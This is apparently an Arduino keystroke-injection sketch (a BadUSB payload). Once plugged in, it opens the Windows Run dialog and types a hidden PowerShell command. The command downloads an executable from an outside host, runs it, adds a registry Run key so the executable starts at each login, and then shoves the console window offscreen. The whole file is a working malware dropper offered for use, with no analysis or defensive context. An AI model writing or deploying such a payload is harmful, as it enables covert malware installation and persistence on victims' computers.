
#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  delay(1000);
  Keyboard.begin();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(1000);
  Keyboard.press('r');
  delay(1000);
  Keyboard.releaseAll();
  delay(700);
  Keyboard.print("powershell -Windowstyle hidden (New-Object Net.WebClient).DownloadFile('http://domain.com','%TEMP%\\baronet.exe');start-process %TEMP%\\baronet.exe;REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"aloo\" /t REG_SZ /F /D \"%%TEMP\\baronet.exe\"");
  delay(100);
  typeKey(KEY_RETURN);
  Keyboard.press(KEY_LEFT_ALT);
  delay(100);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print(F("M"));
  delay(1000);
  for(int i = 0; i < 100; i++) {
    typeKey(KEY_DOWN_ARROW);
  }
  delay(100);
  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
